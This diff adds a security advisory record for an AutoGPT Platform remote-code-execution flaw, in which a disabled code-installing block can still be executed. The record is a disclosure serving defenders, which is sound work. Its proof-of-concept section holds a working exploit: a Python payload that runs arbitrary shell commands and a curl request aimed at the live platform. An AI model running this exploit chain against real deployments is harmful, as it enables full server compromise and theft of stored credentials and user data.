@@ -1,0 +1,48 @@
+{
+  "id": "GHSA-r277-3xc5-c79v",
+  "modified": "2026-01-29T17:49:27.816914Z",
+  "published": "2026-01-29T15:04:03Z",
+  "aliases": [
+    "CVE-2026-24780"
+  ],
+  "summary": "AutoGPT is Vulnerable to RCE via Disabled Block Execution",
+  "details": "### Summary\n\nAutoGPT Platform's block execution endpoints (both main web API and external API) allow executing blocks by UUID without checking the `disabled` flag. Any authenticated user can execute the disabled `BlockInstallationBlock`, which writes arbitrary Python code to the server filesystem and executes it via `__import__()`, achieving Remote Code Execution. In default self-hosted deployments where Supabase signup is enabled, an attacker can self-register; if signup is disabled (e.g., hosted), the attacker needs an existing account.\n\n### Details\n\n**Two vulnerable endpoints exist:**\n\n1. **Main Web API** ([`v1.py#L355-395`](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/api/features/v1.py#L355-L395)) - Any authenticated user:\n\n```python\n@v1_router.post(\n    path=\"/blocks/{block_id}/execute\",\n    dependencies=[Security(requires_user)],  # Just requires login\n)\nasync def execute_graph_block(block_id: str, data: BlockInput, ...):\n    obj = get_block(block_id)\n    if not obj:\n        raise HTTPException(status_code=404, ...)\n\n    # NO CHECK FOR obj.disabled!\n\n    async for name, data in obj.execute(data, ...):\n        output[name].append(data)\n```\n\n2. **External API** ([`external/v1/routes.py#L79-93`](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/api/external/v1/routes.py#L79-L93)) - Same issue.\n\nThe external API is gated by API key permissions, but any authenticated user can mint API keys with arbitrary permissions via the main API (including `EXECUTE_BLOCK`) at [`v1.py#L1408-1424`](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/api/features/v1.py#L1408-L1424). As a result, a low-privilege user can create an API key and invoke the external block execution route.\n\n**The disabled flag is documented but not enforced:**\n\nFrom [`block.py#L459`](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/data/block.py#L459):\n\u003e \"disabled: If the block is disabled, it will not be available for execution.\"\n\nThe block listing endpoint correctly filters disabled blocks (`if not b.disabled`), but the execution endpoints do not check this flag.\n\n**The dangerous block ([`blocks/block.py#L15-78`](https://github.com/Significant-Gravitas/AutoGPT/blob/master/autogpt_platform/backend/backend/blocks/block.py#L15-L78)):**\n\n```python\nclass BlockInstallationBlock(Block):\n    \"\"\"\n    NOTE: This block allows remote code execution on the server,\n    and it should be used for development purposes only.\n    \"\"\"\n\n    def __init__(self):\n        super().__init__(\n            id=\"45e78db5-03e9-447f-9395-308d712f5f08\",  # Hardcoded, public UUID\n            disabled=True,  # NOT ENFORCED!\n        )\n\n    async def run(self, input_data: Input, **kwargs) -\u003e BlockOutput:\n        code = input_data.code\n\n        # Writes attacker code to server filesystem\n        file_path = f\"{block_dir}/{file_name}.py\"\n        with open(file_path, \"w\") as f:\n            f.write(code)\n\n        # Executes via import (RCE)\n        module = __import__(module_name, fromlist=[class_name])\n```\n\n### PoC\n\n**1. Create malicious block code**\n\n```python\nPAYLOAD = '''\nimport os\nfrom backend.data.block import Block, BlockOutput, BlockSchemaInput, BlockSchemaOutput\nfrom backend.data.model import SchemaField\n\nclass RCEBlock(Block):\n    class Input(BlockSchemaInput):\n        cmd: str = SchemaField(description=\"Command\")\n    class Output(BlockSchemaOutput):\n        result: str = SchemaField(description=\"Result\")\n\n    def __init__(self):\n        super().__init__(\n            id=\"aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee\",\n            description=\"RCE\",\n            input_schema=self.Input,\n            output_schema=self.Output,\n        )\n\n    async def run(self, input_data, **kwargs):\n        import subprocess\n        result = subprocess.check_output(input_data.cmd, shell=True).decode()\n        yield \"result\", result\n'''\n```\n\n**2. Execute via main web API (any logged-in user)**\n\n```bash\n# Get session cookie by logging into the web UI, then:\ncurl -X POST \"https://platform.autogpt.app/api/blocks/45e78db5-03e9-447f-9395-308d712f5f08/execute\" \\\n  -H \"Cookie: session=\u003cyour_session_cookie\u003e\" \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\"code\": \"\u003cPAYLOAD\u003e\"}'\n```\n\nThe malicious Python code is written to the server's `backend/blocks/` directory and immediately executed via `__import__()`.\n\n**Alternative route:** Mint an API key with `EXECUTE_BLOCK` via `POST /api-keys`, then call the external API `POST /external-api/v1/blocks/{id}/execute`.\n\n### Impact\n\n**Any user who can create an account on AutoGPT Platform can achieve full Remote Code Execution on the backend server.**\n\nThis allows:\n- Complete server compromise\n- Access to all user data, credentials, and API keys stored in the database\n- Access to environment variables (cloud credentials, secrets)\n- Lateral movement to connected infrastructure (Redis, PostgreSQL, cloud services)\n- Persistent backdoor installation\n\n**Attack requirements:**\n- Create a free account on the platform (default self-hosted enables signup; hosted deployments may disable signup, requiring an existing account)\n- Know the disabled block's UUID (hardcoded in public source code: `45e78db5-03e9-447f-9395-308d712f5f08`)\n\n**Why the `disabled` flag exists but fails:**\n- Block listing correctly filters disabled blocks (users don't see them in UI)\n- Execution endpoints bypass this check entirely\n- The UUID is static and publicly known from the open-source codebase\n\n**Severity note:** CVSS assumes the default self-hosted configuration where signup is enabled (low-privilege authentication is easy to obtain). If signup is disabled in a hosted deployment, likelihood is lower, but impact remains critical once any authenticated account exists.\n\nA fix is available, but was not published to the PyPI registry at time of publication: [0.6.44](https://github.com/Significant-Gravitas/AutoGPT/releases/tag/v0.6.44)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "agpt",
+        "purl": "pkg:pypi/agpt"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "last_affected": "0.2.2"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.2.2"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-r277-3xc5-c79v/GHSA-r277-3xc5-c79v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/Significant-Gravitas/AutoGPT/security/advisories/GHSA-r277-3xc5-c79v"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/Significant-Gravitas/AutoGPT"
+    }
+  ]
+}
